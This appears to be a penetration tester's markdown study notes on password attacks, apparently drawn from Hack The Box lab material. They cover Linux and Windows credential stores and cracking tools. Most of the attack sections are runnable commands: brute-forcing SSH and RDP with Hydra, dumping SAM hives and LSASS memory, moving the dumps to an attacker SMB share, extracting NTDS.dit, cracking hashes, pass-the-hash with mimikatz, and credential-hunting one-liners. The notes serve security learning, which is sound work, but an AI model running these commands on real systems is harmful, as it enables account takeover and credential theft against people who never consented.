## Linux
The /etc/shadow file has a unique format in which the entries are entered and saved when new users are created.

*student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::*

| `$ <id>` | `$ <salt>` | `$ <hashed>`                  |
| -------- | ---------- | ----------------------------- |
| `$ y`    | `$ j9T`    | `$ 3QSBB6CbHEu...SNIP...f8Ms` |

| student:  | $y$j9T$3QSBB6CbHEu...SNIP...f8Ms: | 18955:                  | 0:           | 99999:       | 7:                  | :                      | :                    | :                  |
| ------------- | --------------------------------- | ----------------------- | ------------ | ------------ | ------------------- | ---------------------- | -------------------- | ------------------ |
| `<username>`: | `<encrypted password>`:           | `<day of last change>`: | `<min age>`: | `<max age>`: | `<warning period>`: | `<inactivity period>`: | `<expiration date>`: | `<reserved field>` |

| **ID**   | **Cryptographic Hash Algorithm**                                      |
| -------- | --------------------------------------------------------------------- |
| `$1$`    | [MD5](https://en.wikipedia.org/wiki/MD5)                              |
| `$2a$`   | [Blowfish](https://en.wikipedia.org/wiki/Blowfish_(cipher))           |
| `$5$`    | [SHA-256](https://en.wikipedia.org/wiki/SHA-2)                        |
| `$6$`    | [SHA-512](https://en.wikipedia.org/wiki/SHA-2)                        |
| `$sha1$` | [SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)                      |
| `$y$`    | [Yescrypt](https://github.com/openwall/yescrypt)                      |
| `$gy$`   | [Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1) |
| `$7$`    | [Scrypt](https://en.wikipedia.org/wiki/Scrypt)                        |

---
```
sasa7@htb[/htb]$ cat /etc/passwd
student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

| `htb-student:` | `x:`          | `1000:`  | `1000:`  | `,,,:`       | `/home/htb-student:` | `/bin/bash`                       |
| -------------- | ------------- | -------- | -------- | ------------ | -------------------- | --------------------------------- |
| `<username>:`  | `<password>:` | `<uid>:` | `<gid>:` | `<comment>:` | `<home directory>:`  | `<cmd executed after logging in>` |


## Windows

LSASS

Local Security Authority Subsystem Service (LSASS) is a collection of many modules and has access to all authentication processes that can be found in %SystemRoot%\System32\Lsass.exe.
This service is responsible for the local system security policy, user authentication, and sending security audit logs to the Event log. In other words, it is the vault for Windows-based operating systems, and we can find a more detailed illustration of the LSASS architecture here.\
The Security Account Manager (SAM) is a database file in Windows operating systems that stores users' passwords.\
User passwords are stored in a hash format in a registry structure as either an LM hash or an NTLM hash. This file is located in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM. SYSTEM level permissions are required to view it.

 **Authentication Packages** | **Description**                                                                                                                                                                                                                                                |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Lsasrv.dll`                | The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful. |
| `Msv1_0.dll`                | Authentication package for local machine logons that don't require custom authentication.                                                                                                                                                                      |
| `Samsrv.dll`                | The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.                                                                                                                                       |
| `Kerberos.dll`              | Security package loaded by the LSA for Kerberos-based authentication on a machine.                                                                                                                                                                             |
| `Netlogon.dll`              | Network-based logon service.                                                                                                                                                                                                                                   |
| `Ntdsa.dll`                 | This library is used to create new records and folders in the Windows registry.     |

Windows systems can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the Domain Controller (DC) must validate the credentials from the Active Directory database (ntds.dit), which is stored in %SystemRoot%\ntds.dit. \

Credential Manager
`PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\`

 Each Domain Controller hosts a file called NTDS.dit. NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:

- User accounts (username & password hash)
- Group accounts
- Computer accounts
- Group policy objects
- 
## John The Ripper

[Link to the commands](https://github.com/majapljeka/my-pentest-notes/blob/main/Notes/Passwords/Password%20Cracking.md)

| **Encryption Technology**                 | **Description**                                                                                                                   |
| ----------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| `UNIX crypt(3)`                           | Crypt(3) is a traditional UNIX encryption system with a 56-bit key.                                                               |
| `Traditional DES-based`                   | DES-based encryption uses the Data Encryption Standard algorithm to encrypt data.                                                 |
| `bigcrypt`                                | Bigcrypt is an extension of traditional DES-based encryption. It uses a 128-bit key.                                              |
| `BSDI extended DES-based`                 | BSDI extended DES-based encryption is an extension of the traditional DES-based encryption and uses a 168-bit key.                |
| `FreeBSD MD5-based` (Linux & Cisco)       | FreeBSD MD5-based encryption uses the MD5 algorithm to encrypt data with a 128-bit key.                                           |
| `OpenBSD Blowfish-based`                  | OpenBSD Blowfish-based encryption uses the Blowfish algorithm to encrypt data with a 448-bit key.                                 |
| `Kerberos/AFS`                            | Kerberos and AFS are authentication systems that use encryption to ensure secure entity communication.                            |
| `Windows LM`                              | Windows LM encryption uses the Data Encryption Standard algorithm to encrypt data with a 56-bit key.                              |
| `DES-based tripcodes`                     | DES-based tripcodes are used to authenticate users based on the Data Encryption Standard algorithm.                               |
| `SHA-crypt hashes`                        | SHA-crypt hashes are used to encrypt data with a 256-bit key and are available in newer versions of Fedora and Ubuntu.            |
| `SHA-crypt` and `SUNMD5 hashes` (Solaris) | SHA-crypt and SUNMD5 hashes use the SHA-crypt and MD5 algorithms to encrypt data with a 256-bit key and are available in Solaris. |
                                                        

## Remote Password Attack

### WinRM (5985, 5986) 
 It is a network protocol based on XML web services using the Simple Object Access Protocol (SOAP) used for remote management of Windows systems. 

### Evil-WinRM

`evil-winrm -i 10.129.42.197 -u user -p password`

### CrackMapExec

`sudo apt-get -y install crackmapexec` \
`crackmapexec -h` 

#### SMB
`crackmapexec smb -h` \
`crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares` \
`smbclient -U user \\\\10.129.42.197\\SHARENAME` \
`crackmapexec winrm 10.129.42.197 -u user.list -p password.list`

### Hydra

`hydra -L user.list -P password.list ssh://10.129.42.197` \
`hydra -L user.list -P password.list rdp://10.129.42.197` \
`xfreerdp /v:10.129.42.197 /u:user /p:password`

### Hashcat - Generating Rule-base wordlist

`hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list`

### Generating wordlist with CEWL
` cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist` \
`wc -l inlane.wordlist`

### Default Credentials Cheat sheet
[DefCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) 

Credential Stuffing - Hydra
`hydra -C user_pass.list ssh://10.129.42.197`

## Windows Local Password Attack

### Copying SAM Registry Hives
`C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save` \
`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/` \
`move sam.save \\10.10.15.16\CompData` \
`python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save LOCAL` \
`sudo vim hashestocrack.txt` \
`sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt` OR `john –format=NT –wordlist /usr/share/wordlists/rockyou.txt hash.txt`

| Registry Hive   | Description                                                                                                                                                |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `hklm\sam`      | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| `hklm\system`   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                              |
| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                        |

#### Dumping LSA Secrets Remotely
*LSA allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.* \
`crackmapexec smb 10.129.42.198 --local-auth -u user -p password --lsa` \
`crackmapexec smb 10.129.42.198 --local-auth -u user -p password --sam` 


### Attacking LSASS
Upon initial logon, LSASS will:
- Cache credentials locally in memory
- Create access tokens
- Enforce security policies
- Write to Windows security log

1. GUI based - Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file
2. Finding LSASS in cmd `C:\Windows\system32> tasklist /svc` OR Powershell ` Get-Process lsass`
3. Create lsass.dmp in PS `PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`
4. `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support`
5. `PS C:\Windows\system32> move C:\lsass.dmp \\10.10.14.249\Share`
6. `pypykatz lsa minidump /home/peter/Documents/lsass.dmp`
7. `sudo hashcat -m 1000 hashvalue /usr/share/wordlists/rockyou.txt`

### Attacking Active Directory & NTDS.dit
*Recall that NTDS.dit(directory informational tree) file is stored at %systemroot%/ntds. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain*
1. [automated list generator](https://github.com/urbanadventurer/username-anarchy)
2. Launching the Attack with CrackMapExec - `crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt` \

#### Capturing NTDS.dit
[NTDS attack](https://attack.mitre.org/techniques/T1003/003/) \
Checking Local Group Membership = `*Evil-WinRM* PS C:\> net localgroup`  
Checking User Account Privileges including Domain = `PS C:\> net user blabla` *and if have Administrators and Domain Administrator rights* 
Creating Shadow Copy of C: `PS C:\> vssadmin CREATE SHADOW /For=C:` \
Copying NTDS.dit from the VSS: `PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`\
`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support` \
`PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData` 

A Faster Method: Using cme to Capture NTDS.dit = `crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds` \
Pass-the-Hash with Evil-WinRM Example = ` evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"`

### Credential Hunting in Windows
1. [Lazagne](https://github.com/AlessandroZ/LaZagne) = `C:\Users\bob\Desktop> start lazagne.exe all`
2. `C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`

Here are some other places we should keep in mind when credential hunting:
- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in web.config files on dev machines and IT shares
- unattend.xml
- Passwords in the AD user or computer description fields
- KeePass databases --> pull hash, crack and get loads of access.
- Found on user systems and shares
- Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint
    
---
## Linux Local Password Attack

### Credential Hunting in Linux
Configuration files: \
`for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done`

Credentials in Configuration Files: \
`for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done`

Databases: \
`for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done`

Notes: \
`find /home/* -type f -name "*.txt" -o ! -name "*.*"`

Scripts: \
`for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done`

CronJobs: \
`cat /etc/crontab` \
`ls -la /etc/cron.*/`

SSH Private Keys: \
`grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"`

SSH Public Keys: \
`grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"`

History: \
*In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in .bash_history. Nevertheless, other files like .bashrc or .bash_profile can contain important information.* \
`tail -n5 /home/*/.bash*`

Logs: 
| **Log File**          | **Description**                                    |
| --------------------- | -------------------------------------------------- |
| `/var/log/messages`   | Generic system activity logs.                      |
| `/var/log/syslog`     | Generic system activity logs.                      |
| `/var/log/auth.log`   | (Debian) All authentication related logs.          |
| `/var/log/secure`     | (RedHat/CentOS) All authentication related logs.   |
| `/var/log/boot.log`   | Booting information.                               |
| `/var/log/dmesg`      | Hardware and drivers related information and logs. |
| `/var/log/kern.log`   | Kernel related warnings, errors and logs.          |
| `/var/log/faillog`    | Failed login attempts.                             |
| `/var/log/cron`       | Information related to cron jobs.                  |
| `/var/log/mail.log`   | All mail server related logs.                      |
| `/var/log/httpd`      | All Apache related logs.                           |
| `/var/log/mysqld.log` | All MySQL server related logs.                     |

`for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done`

Memory and Cache: \
[mimipenguin requires admin/root permissions](https://github.com/huntergregal/mimipenguin) \
`sudo python3 mimipenguin.py` \
`sudo bash mimipenguin.sh ` \

[LaZagne](https://github.com/AlessandroZ/LaZagne)
`sudo python2.7 laZagne.py all`

Browsers: \
Firefox Stored Credentials
- `ls -l .mozilla/firefox/ | grep default` \
- `cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .` \
- [Firefox Decrypt](https://github.com/unode/firefox_decrypt) \
- `python3.9 firefox_decrypt.py`

#### Passwd, Shadow & Opasswd
standard mechanism PAM located in /usr/lib/x86_x64-linux-gnu/security/ in Debian based distributions

Passwd Format:
| `Pera`     | `:` | `x`           | `:` | `1000` | `:` | `1000` | `:` | `PeraPeri,,,`      | `:` | `/home/Pera`     | `:` | `/bin/bash` |
| ---------- | --- | ------------- | --- | ------ | --- | ------ | --- | ------------------ | --- | ---------------- | --- | ----------- |
| Login name |     | Password info |     | UID    |     | GUID   |     | Full name/comments |     | Home directory   |     | Shell       |

*Usually, we find the value x in this field, which means that the passwords are stored in an encrypted form in the /etc/shadow file.*

If x is removed we can login as root with `su`, lets check with `head -n 1 /etc/passwd`

---
#### Shadow File 
The /etc/shadow file is also only readable by users who have administrator rights.

| `Pera`   | `:` | `$6$wBRzy$...SNIP...x9cDWUxW1` | `:` | `18937`        | `:` | `0`         | `:` | `99999`     | `:` | `7`            | `:`               | `:`             | `:`    |
| -------- | --- | ------------------------------ | --- | -------------- | --- | ----------- | --- | ----------- | --- | -------------- | ----------------- | --------------- | ------ |
| Username |     | Encrypted password             |     | Last PW change |     | Min. PW age |     | Max. PW age |     | Warning period | Inactivity period | Expiration date | Unused |

#### Opasswd
`sudo cat /etc/security/opasswd`

#### Cracking Linux Credentials
```
sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak 
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

## Windows Lateral Movement

#### Pass the Hash (PtH)
With NTLM, passwords stored on the server and domain controller are not "salted," which means that an adversary with a password hash can authenticate a session without knowing the original password.
Hashes can be obtained in several ways, including:

- Dumping the local SAM database from a compromised host.
- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
- Pulling the hashes from memory (lsass.exe).


[mimikatz](https://github.com/gentilkiwi/mimikatz)
`c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit`

[Invoke the hash](https://github.com/Kevin-Robertson/Invoke-TheHash)


#### Pass the Ticket (PtT) from Windows
#### Pass the Ticket (PtT) from Linux

## Cracking Files

